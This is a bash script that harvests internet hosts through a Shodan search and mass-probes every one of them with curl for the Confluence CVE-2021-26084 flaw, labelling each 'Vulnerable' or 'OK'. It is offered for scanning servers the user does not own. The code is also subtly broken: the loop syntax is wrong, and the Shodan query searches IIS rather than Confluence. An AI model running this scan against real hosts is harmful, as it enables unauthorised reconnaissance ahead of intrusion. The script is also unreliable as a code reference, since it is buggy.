#!/bin/bash

clear
echo 'CFC[CVE-2021-26084]'

#Set Shodan API Token
shodan init APITOKENSHODAN

#shodan search --fields ip_str,port,org,hostnames iis

#Search IIS and extract ip_str fields, and save in confluence_servers.txt
shodan search --fields ip_str iis >> confluence_servers.txt

#Atlassian Confluence CVE-2021-26084 one-liner mass checker
cat confluence_servers.txt | while read host do; do curl --connect-timeout 10 --max-time 60 --path-as-is --silent --insecure --user-agent "Mozilla/5.1 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" "https://$host/pages/createpage-entervariables.action?SpaceKey=x" | grep -q 'action="doenterpagevariables.action"' && printf "$host \033[1;35m Vulnerable\e[0m\n" || printf "$host \033[1;32mOK\e[0m\n"; done;
